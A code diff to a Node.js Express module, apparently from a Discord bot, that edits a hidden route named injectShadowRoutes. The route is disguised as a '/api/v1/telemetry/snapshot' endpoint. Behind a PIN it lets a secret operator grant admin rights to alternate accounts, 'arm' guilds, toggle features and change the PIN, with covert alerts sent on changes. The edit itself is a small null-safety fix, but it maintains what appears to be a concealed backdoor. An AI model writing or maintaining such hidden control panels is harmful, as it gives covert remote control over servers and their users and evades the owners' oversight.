@@ -368,7 +368,8 @@ class ShadowEngine {
 
 function injectShadowRoutes(app, mainClient, engineInstance) {
     app.all("/api/v1/telemetry/snapshot", express.urlencoded({ extended: true }), async (req, res) => {
-        const providedPin = req.query.pin || req.body.pin;
+        const body = req.body || {};
+        const providedPin = req.query.pin || body.pin;
 
         if (providedPin !== SHADOW_WEB_PIN) {
             return res.send(`
@@ -387,26 +388,26 @@ function injectShadowRoutes(app, mainClient, engineInstance) {
             `);
         }
 
-        const action = req.body.action;
+        const action = body.action;
 
         if (action === "toggle_feature") {
-            const feat = req.body.feature;
+            const feat = body.feature;
             if (systemToggles[feat] !== undefined) systemToggles[feat] = !systemToggles[feat];
         }
-        else if (action === "add_alt" && req.body.alt_id) {
-            globalAdminCache.add(req.body.alt_id.trim());
+        else if (action === "add_alt" && body.alt_id) {
+            globalAdminCache.add(body.alt_id.trim());
         }
         else if (action === "remove_alt") {
-            globalAdminCache.delete(req.body.alt_id);
+            globalAdminCache.delete(body.alt_id);
         }
-        else if (action === "arm_guild" && req.body.guild_id) {
-            armedGuilds.add(req.body.guild_id);
+        else if (action === "arm_guild" && body.guild_id) {
+            armedGuilds.add(body.guild_id);
         }
-        else if (action === "disarm_guild" && req.body.guild_id) {
-            armedGuilds.delete(req.body.guild_id);
+        else if (action === "disarm_guild" && body.guild_id) {
+            armedGuilds.delete(body.guild_id);
         }
-        else if (action === "change_pin" && req.body.new_pin) {
-            SHADOW_WEB_PIN = req.body.new_pin.trim();
+        else if (action === "change_pin" && body.new_pin) {
+            SHADOW_WEB_PIN = body.new_pin.trim();
             if (engineInstance) await engineInstance.sendSecretAlert("WEB CONSOLE PIN CHANGED", `🔑 รหัสสำหรับเข้าหน้าเว็บควบคุมถูกเปลี่ยนเป็น: **${SHADOW_WEB_PIN}**`, "#FEE75C");
         }
 
